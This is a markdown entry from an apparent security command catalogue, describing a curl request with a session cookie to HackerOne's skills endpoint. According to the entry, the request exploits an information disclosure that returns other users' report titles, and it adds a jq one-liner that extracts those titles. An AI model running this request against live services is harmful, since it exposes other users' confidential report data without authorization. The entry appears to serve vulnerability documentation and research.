---
id: cmd-get-skills-endpoint-001
data: >-
  curl -H "Cookie: your_session_cookie_here"
  https://hackerone.com/settings/skills
tags:
  - api
  - information-disclosure
  - recon
type: command
output: >-
  JSON response with skills and endorsements array containing report IDs and
  titles
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:22.902Z'
verified: false
validated: true
submitted: true
---
# get-hackerone-skills-endpoint

## Command

```bash
curl -H "Cookie: your_session_cookie_here" https://hackerone.com/settings/skills
```

## Description

This command performs a GET request to HackerOne's skills API endpoint, exploiting an information disclosure to retrieve unauthorized report titles from other users' submissions. Use it during authenticated sessions to observe the vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: ..."` | Authenticated session cookie from HackerOne login | Yes |
| `https://hackerone.com/settings/skills` | Target API endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -H "Cookie: _hackerone_session=abc123" https://hackerone.com/settings/skills
```

### Advanced Usage with JSON Parsing

```bash
curl -H "Cookie: _hackerone_session=abc123" https://hackerone.com/settings/skills | jq '.[] | .endorsements[] | .report.title'
```

## Expected Output

A JSON object like:

```json
[
  {
    "name": "Web Applications",
    "endorsements": [
      {
        "report": {
          "id": 188719,
          "title": "XXXXXXXX"
        }
      }
    ]
  }
]
```

Successful execution shows endorsements from other users, confirming disclosure.

## Related

- [[Related Procedure|procedures/Exploit-HackerOne-Skills-Endpoint-for-Report-Title-Disclosure]]
